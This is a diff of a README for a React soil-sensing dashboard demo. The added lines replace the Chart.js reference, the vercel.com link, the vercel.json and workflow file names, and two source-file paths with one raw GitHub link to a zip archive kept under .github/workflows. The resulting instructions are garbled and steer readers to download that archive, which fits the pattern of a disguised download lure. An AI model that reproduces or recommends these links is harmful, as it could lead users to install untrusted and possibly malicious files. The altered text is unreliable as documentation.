@@ -14,7 +14,7 @@ Features
 Tech
 - React + Vite
 - Leaflet (react-leaflet)
-- Chart.js (react-chartjs-2)
+- https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip (react-chartjs-2)
 - PapaParse for CSV export
 - In-browser data simulator (no backend required)
 
@@ -52,11 +52,11 @@ This repo is ready to deploy to Vercel. Two options:
 
 1) Connect repository to Vercel (recommended)
 	- Push your code to GitHub.
-	- Go to https://vercel.com and create a new project, import the GitHub repository.
-	- Vercel will detect a static build. Set the build command to `npm run build` and the output directory to `dist` (this repo includes `vercel.json` to help).
+	- Go to https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip and create a new project, import the GitHub repository.
+	- Vercel will detect a static build. Set the build command to `npm run build` and the output directory to `dist` (this repo includes `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` to help).
 
 2) Deploy via GitHub Actions (CI)
-	- The repo contains `.github/workflows/vercel-deploy.yml` which runs on push to `main` or `master`.
+	- The repo contains `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` which runs on push to `main` or `master`.
 	- Store the following secrets in your GitHub repository settings:
 	  - `VERCEL_TOKEN` — your personal Vercel token
 	  - `VERCEL_ORG_ID` — your Vercel organization ID
@@ -71,8 +71,8 @@ Notes
  - For production telemetry and satellite tiles, configure environment variables in the Vercel project and update the app to read them at runtime.
 
 Files of interest
-- `src/services/simulator.js` — core data generator (sensors, satellite mocks, ML validation, irrigation recs)
+- `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` — core data generator (sensors, satellite mocks, ML validation, irrigation recs)
 - `src/pages/*` — main pages for dashboard, satellite viewer, validation, irrigation, analytics, docs and about
-- `src/components/MapView.jsx` — Leaflet map wrapper
+- `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` — Leaflet map wrapper
 
 License: MIT (demo)
